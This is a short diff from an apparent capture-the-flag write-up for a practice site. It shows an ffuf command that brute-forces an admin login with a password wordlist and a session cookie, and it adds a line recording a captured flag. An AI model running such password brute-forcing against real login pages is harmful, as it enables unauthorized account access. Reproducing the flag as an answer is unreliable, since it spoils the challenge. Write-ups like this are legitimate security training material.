@@ -46,3 +46,8 @@ to filter out 200 requets i used command:
 
 ffuf -p 0.1 -t 1 -w ~/wordlists/passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200
 
+
+
+
+
+### 5-flag 	[^FLAG^93D7491FB4B054FB5C5AC3E0292BE41C^FLAG^]
